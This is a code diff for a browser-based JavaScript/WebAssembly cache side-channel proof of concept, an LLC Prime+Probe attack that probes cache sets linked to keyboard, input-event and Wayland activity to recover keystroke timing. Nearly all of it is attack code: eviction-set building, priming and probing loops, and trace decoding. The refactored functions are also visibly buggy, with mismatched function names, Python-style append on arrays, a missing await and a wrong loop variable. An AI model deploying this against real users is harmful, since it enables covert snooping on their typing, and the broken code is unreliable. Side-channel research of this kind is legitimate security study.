@@ -460,6 +460,12 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+function assert(condition, message){
+    if(!condition){
+        throw message || "assertion error";
+    }
+}
+
 function cross_core_test(evset, rounds){
     transmit_str = "";
     for(let i  = 0; i < 20; i++){
@@ -627,8 +633,124 @@ async function find_evsets_all_slices(victim, module, memory, buffer, num_call){
     return found_sets;
 }
 
+async function find_targeted_evsets(sets, slices, module, memory, buffer){
+    let evsets = []
+    if(sets.length > slices.length){
+        for(let i = 0; i < sets.length-slices.length; i++){
+            slices.append(0); // append 0 if slices were not specified     
+        } 
+    } 
+    for(let i = 0; i < sets.length; i++){
+        let victim = sets[i] * LINE_SIZE; 
+        let ret_sets = find_evsets_all_slices(victim, module, memory, buffer, i); 
+        evsets.append(ret_sets[slices[i]]);
+    }
+    return evsets;
+} 
+
+function prime_probe_sec(evsets){
+    
+    const BUFFER_BYTES = 8*1024*1024;
+    let traces = [];
+    for(let i = 0; i < evsets.length; i++){
+        traces.append(new Uint8Array(BUFFER_BYTES));
+        traces[i].fill(0);
+    }
+
+    /* warm up the set for prime+probe attack */
+    for(let i = 0; i < 10; i++){
+        for(let j = 0; j < evsets.length; j++){
+            evsets[j].probe();
+        }
+    }
+    
+    for(let byte_index = 0; i < BUFFER_BYTES; byte_index++){
+        for(let i = 0; i < 8; i++){
+            for(let j = 0; j < evsets.length; j++){
+                traces[j][byte_index] += (evsets[j].probe() << i);
+            }
+        }
+    }
+    
+    return traces;
+}
+
 // This function provides a proof of concept LLC Prime+Probe attack to recover keystrokes
 async function l3pp_keystrokes_poc(){ 
+
+    /* initialize modules and tools */
+    const {module, memory} = await getAccessModules();
+    const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
+    const buffer = new Uint32Array(memory.buffer);
+    let {wasm_hit, wasm_miss} = instance.exports;
+
+    // Avoid allocate-on-write optimizations
+    buffer.fill(1);
+    buffer.fill(0);
+
+    await startTimer();
+
+    // Build eviction sets
+
+    self.importScripts('evsets/main.js');
+        
+    /* define sets and slices to monitor */
+    const KBD_KEYCODE_SET = 366;
+    const KEYCODE_SLICE = 3;
+    const KBD_EVENT_SET = 413;
+    const EVENT_SLICE = 3;
+    const WAYLAND_SET = 1746;
+    const WAYLAND_SLICE = 3;
+
+    let sets = [KBD_KEYCODE_SET, KBD_EVENT_SET, WAYLAND_SET];
+    let slices = [KEYCODE_SLICE, EVENT_SLICE, WAYLAND_SLICE];
+
+    evsets = await find_target_evsets(sets, slices, module, memory, buffer);
+
+    /* typing test begins */
+    const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
+    const NUM_MEASUREMENTS_MS = 1024;
+
+    let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let wayland_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+   
+    let traces = prime_probe_sec(evsets);
+    let keycode_traces = traces[0];
+    let event_traces = traces[1];
+    let wayland_traces = traces[2];
+
+    let end_measurement = Math.floor(performance.now());
+    log("end: " + end_measurement)
+    let duration = end_measurement - start_measurement;
+    log("duration: " + duration)
+
+    for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
+        for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
+            let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let wayland_data = wayland_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            for(let l = 0; l < 8; l++){
+                let keycode_result = keycode_data & 1;
+                let event_result = event_data & 1;
+                let wayland_result = wayland_data & 1;
+                keycode_hit_count_per_ms[i] += keycode_result;
+                event_hit_count_per_ms[i] += event_result;
+                wayland_hit_count_per_ms[i] += wayland_result;
+                keycode_data >>= 1;
+                event_data >>= 1;
+                wayland_data >>= 1;
+            }
+        }
+    }
+
+    await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "wayland_data": wayland_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
+
+    // remote_set_profiling(evset);
+    await stopTimer();
+}
+
+async function simulate_keystrokes(){
     const {module, memory} = await getAccessModules();
     const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
     const buffer = new Uint32Array(memory.buffer);
@@ -665,85 +787,7 @@ async function l3pp_keystrokes_poc(){
     log(`set: ${WAYLAND_SET}, slice: ${WAYLAND_SLICE}`)
     wayland_found_sets = await find_evsets_all_slices(WAYLAND_VICTIM, module, memory, buffer, 2);
     log(wayland_found_sets);
-
-    /* typing test begins */
-    log("typing test begins now")
-
-    const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
-    const NUM_MEASUREMENTS_MS = 1024;
-
-    let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
-    let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
-    let wayland_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
-    let keycode_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
-    let event_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
-    let wayland_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
-
-    keycode_hit_count_per_ms.fill(0);
-    keycode_traces.fill(0);
-    event_hit_count_per_ms.fill(0);
-    event_traces.fill(0);
-    wayland_hit_count_per_ms.fill(0);
-    wayland_traces.fill(0);
-
-    let num_traces = 0;
-
-    log(keycode_found_sets[KEYCODE_SLICE]["elements"])
-    log(event_found_sets[KEYCODE_SLICE]["elements"])
-    log(wayland_found_sets[KEYCODE_SLICE]["elements"])
-
-    await sleep(5000);
-    let start_measurement = Math.floor(performance.now());
-    log("start: "+start_measurement)
-    
-    /* warm up all sets for the test */
-    for(let i = 0; i < 10; i++){
-        keycode_found_sets[KEYCODE_SLICE].probe()
-        event_found_sets[EVENT_SLICE].probe()
-        wayland_found_sets[WAYLAND_SLICE].probe() 
-    } 
-
-    while(num_traces < KEYSTROKE_BUFFER_SIZE){
-        for(let i = 0; i < 8; i++){
-            let keycode_result = keycode_found_sets[KEYCODE_SLICE].probe();
-            let event_result = event_found_sets[EVENT_SLICE].probe(); 
-            let wayland_result = wayland_found_sets[WAYLAND_SLICE].probe(); 
-            keycode_traces[num_traces] += (keycode_result << i); 
-            event_traces[num_traces] += (event_result << i); 
-            wayland_traces[num_traces] += (wayland_result << i); 
-        }
-        num_traces++;
-    }
-
-    let end_measurement = Math.floor(performance.now());
-    log("end: " + end_measurement)
-    let duration = end_measurement - start_measurement;
-    log("duration: " + duration)
-
-    for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
-        for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
-            let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
-            let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
-            let wayland_data = wayland_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
-            for(let l = 0; l < 8; l++){
-                let keycode_result = keycode_data & 1;
-                let event_result = event_data & 1;
-                let wayland_result = wayland_data & 1;
-                keycode_hit_count_per_ms[i] += keycode_result;
-                event_hit_count_per_ms[i] += event_result;
-                wayland_hit_count_per_ms[i] += wayland_result;
-                keycode_data >>= 1;
-                event_data >>= 1;
-                wayland_data >>= 1;
-            }
-        }
-    }
-
-    await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "wayland_data": wayland_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
-
-    // remote_set_profiling(evset);
-    await stopTimer();
 }
 
-l3pp_keystrokes_poc()
+// l3pp_keystrokes_poc()
 
